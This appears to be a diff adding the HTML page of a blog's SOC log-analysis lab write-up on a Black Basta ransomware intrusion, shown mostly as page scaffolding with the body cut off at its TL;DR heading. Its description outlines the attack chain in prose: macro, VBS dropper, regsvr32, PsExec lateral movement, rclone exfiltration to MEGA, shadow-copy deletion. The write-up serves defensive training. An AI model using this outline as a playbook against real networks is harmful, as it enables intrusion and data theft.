@@ -1,0 +1,1603 @@
+<!doctype html>
+<html
+  lang="en-us"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en-us">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>ELK-Black Basta &middot; bubka hacks stuff</title>
+    <meta name="title" content="ELK-Black Basta &middot; bubka hacks stuff">
+  
+
+  
+  
+    <meta name="description" content="A finance employee opened a malicious Excel macro from a drive-by download, which executed a VBS dropper, loaded WindowsUpdaterFX.dll via regsvr32, established persistence, dropped Pancake.jpg.exe as a C2 backdoor, performed internal reconnaissance, laterally moved to a domain controller via PsExec using compromised credentials, exfiltrated client data to MEGA via rclone, deleted shadow copies, and deployed BlackBasta ransomware.">
+  
+  
+    <meta name="keywords" content="ELK,SOC,SIEM,Log Analysis,BlackBasta,Ransomware,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/blue_team/elk-black-basta/">
+  
+
+  
+  
+    <meta name="author" content="Bubka">
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/blue_team/elk-black-basta/">
+  <meta property="og:site_name" content="bubka hacks stuff">
+  <meta property="og:title" content="ELK-Black Basta">
+  <meta property="og:description" content="A finance employee opened a malicious Excel macro from a drive-by download, which executed a VBS dropper, loaded WindowsUpdaterFX.dll via regsvr32, established persistence, dropped Pancake.jpg.exe as a C2 backdoor, performed internal reconnaissance, laterally moved to a domain controller via PsExec using compromised credentials, exfiltrated client data to MEGA via rclone, deleted shadow copies, and deployed BlackBasta ransomware.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blue_team">
+    <meta property="article:published_time" content="2026-04-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-09T00:00:00+00:00">
+    <meta property="article:tag" content="ELK">
+    <meta property="article:tag" content="SOC">
+    <meta property="article:tag" content="SIEM">
+    <meta property="article:tag" content="Log Analysis">
+    <meta property="article:tag" content="BlackBasta">
+    <meta property="article:tag" content="Ransomware">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ELK-Black Basta">
+  <meta name="twitter:description" content="A finance employee opened a malicious Excel macro from a drive-by download, which executed a VBS dropper, loaded WindowsUpdaterFX.dll via regsvr32, established persistence, dropped Pancake.jpg.exe as a C2 backdoor, performed internal reconnaissance, laterally moved to a domain controller via PsExec using compromised credentials, exfiltrated client data to MEGA via rclone, deleted shadow copies, and deployed BlackBasta ransomware.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.6fd4b8900b1491642e45a301ddc0e62e3044b29aba5cede445916db78d319096920cf87a472337976190ba979e93c155cfc2d99e5fb87cf220b6b36107fce6dd.css"
+    integrity="sha512-b9S4kAsUkWQuRaMB3cDmLjBEspq6XO3kRZFtt40xkJaSDPh6RyM3l2GQupeek8FVz8LZnl&#43;4fPIgtrNhB/zm3Q==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
+      integrity="sha512-Z2JKNXySjSm5/hm6AaHjLAWtEynKKnEr8QRG3wxocpA9DBSyH3aJa1eloHEJQIBUFs7jiFHZBn22VViBGI41pQ=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+  
+  
+  
+  
+  <script
+    defer
+    type="text/javascript"
+    src="/js/mermaid.bundle.123b31b3c46015cee384d15cf0ef614f7ed885722a7e6f496f9b83d7b8400aef5dc2f3b9fc778649d5ba948bf957b3c67bbdf4de0033db316bbe394e2f7da794.js"
+    integrity="sha512-Ejsxs8RgFc7jhNFc8O9hT37YhXIqfm9Jb5uD17hACu9dwvO5/HeGSdW6lIv5V7PGe7303gAz2zFrvjlOL32nlA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "",
+    "name": "ELK-Black Basta",
+    "headline": "ELK-Black Basta",
+    
+    "inLanguage": "en-us",
+    "url" : "http://localhost:1313/blue_team/elk-black-basta/",
+    "author" : {
+      "@type": "Person",
+      "name": "Bubka"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-04-09T00:00:00\u002b00:00",
+    "datePublished": "2026-04-09T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-04-09T00:00:00\u002b00:00",
+    
+    "keywords": ["ELK","SOC","SIEM","Log Analysis","BlackBasta","Ransomware"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1304"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      bubka hacks stuff
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/investigations/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="[investigations]"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          [investigations]
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/blue_team/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="[alert analysis]"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          [alert analysis]
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/investigations/"
+        aria-label="[investigations]"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          [investigations]
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/blue_team/"
+        aria-label="[alert analysis]"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          [alert analysis]
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+  <script>
+    (function () {
+      var mainmenu = document.querySelector(".main-menu");
+      if (!mainmenu) return;
+
+      var path = window.location.pathname;
+      var links = mainmenu.querySelectorAll('a[href="' + path + '"]');
+
+      links.forEach(function (link) {
+        var targets = link.querySelectorAll("span");
+        targets.forEach(function (el) {
+          el.classList.add("active");
+        });
+      });
+    })();
+  </script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+
+
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        ELK-Black Basta
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-04-09T00:00:00&#43;00:00">April 9, 2026</time>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/elk/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    ELK
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/soc/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    SOC
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/siem/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    SIEM
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/log-analysis/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Log Analysis
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/blackbasta/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    BlackBasta
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/ransomware/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ransomware
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600 text-sm">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span class="hl">TL;DR</span></a></li>
+        <li><a href="#initial-access"><span>Initial Access</span></a></li>
+        <li><a href="#execution-chain"><span>Execution Chain</span></a>
+          <ul>
+            <li><a href="#excel-macro"><span>Excel Macro</span></a></li>
+            <li><a href="#vbs-and-dll-loading"><span>VBS and DLL Loading</span></a></li>
+            <li><a href="#persistence-and-defense-evasion"><span>Persistence and Defense Evasion</span></a></li>
+            <li><a href="#dropper-and-c2-backdoor"><span>Dropper and C2 Backdoor</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#discovery-and-reconnaissance"><span>Discovery and Reconnaissance</span></a>
+          <ul>
+            <li><a href="#host-enumeration"><span>Host Enumeration</span></a></li>
+            <li><a href="#network-scanning-and-tool-staging"><span>Network Scanning and Tool Staging</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#lateral-movement"><span>Lateral Movement</span></a></li>
+        <li><a href="#collection-and-exfiltration"><span>Collection and Exfiltration</span></a></li>
+        <li><a href="#pre-ransomware-staging"><span>Pre-Ransomware Staging</span></a></li>
+        <li><a href="#ransomware-execution-and-cleanup"><span>Ransomware Execution and Cleanup</span></a>
+          <ul>
+            <li><a href="#shadow-copy-deletion"><span>Shadow Copy Deletion</span></a></li>
+            <li><a href="#ransomware-deployment"><span>Ransomware Deployment</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#iocs"><span class="hl">IOCs</span></a></li>
+        <li><a href="#attack-timeline"><span class="hl">Attack Timeline</span></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span class="hl">TL;DR</span></a></li>
+        <li><a href="#initial-access"><span>Initial Access</span></a></li>
+        <li><a href="#execution-chain"><span>Execution Chain</span></a>
+          <ul>
+            <li><a href="#excel-macro"><span>Excel Macro</span></a></li>
+            <li><a href="#vbs-and-dll-loading"><span>VBS and DLL Loading</span></a></li>
+            <li><a href="#persistence-and-defense-evasion"><span>Persistence and Defense Evasion</span></a></li>
+            <li><a href="#dropper-and-c2-backdoor"><span>Dropper and C2 Backdoor</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#discovery-and-reconnaissance"><span>Discovery and Reconnaissance</span></a>
+          <ul>
+            <li><a href="#host-enumeration"><span>Host Enumeration</span></a></li>
+            <li><a href="#network-scanning-and-tool-staging"><span>Network Scanning and Tool Staging</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#lateral-movement"><span>Lateral Movement</span></a></li>
+        <li><a href="#collection-and-exfiltration"><span>Collection and Exfiltration</span></a></li>
+        <li><a href="#pre-ransomware-staging"><span>Pre-Ransomware Staging</span></a></li>
+        <li><a href="#ransomware-execution-and-cleanup"><span>Ransomware Execution and Cleanup</span></a>
+          <ul>
+            <li><a href="#shadow-copy-deletion"><span>Shadow Copy Deletion</span></a></li>
+            <li><a href="#ransomware-deployment"><span>Ransomware Deployment</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#iocs"><span class="hl">IOCs</span></a></li>
+        <li><a href="#attack-timeline"><span class="hl">Attack Timeline</span></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <div class="meta-box">
+  <div class="meta-pill difficulty ">
+    <span class="meta-label">Difficulty:</span>
+    <span class="meta-value">Medium</span>
+  </div>
+
+  <div class="meta-pill">
+    <span class="meta-label">OS:</span>
+    <span class="meta-value">Windows</span>
+  </div>
+
+  <div class="meta-pill">
+    <span class="meta-label">Date:</span>
+    <span class="meta-value"></span>
+  </div>
+</div>
+
+
+<h3 class="relative group"><span class="hl">TL;DR</span>
+    <div id="tldr" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
